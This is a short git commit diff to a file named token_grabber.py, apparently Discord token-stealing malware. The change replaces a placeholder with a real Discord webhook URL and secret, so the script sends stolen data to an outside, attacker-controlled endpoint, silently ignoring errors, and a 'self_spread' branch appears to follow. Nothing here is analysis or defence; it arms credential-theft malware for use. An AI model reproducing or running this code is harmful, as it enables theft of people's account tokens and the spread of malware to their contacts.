2621907018fab3ce8608d8f1b2fdd54a7dc6a4e6
Shlok-1-art <SHLOK.BORAD16@GMAIL.COM>
2024-12-04 21:40:34 +0530

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1307279783926697995/mowJTwfPnsicQRkmtUp0WATcgQCjnN0x-iouSsrOXotzyZpgt9FDwNYAAk66tX2gO05n", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
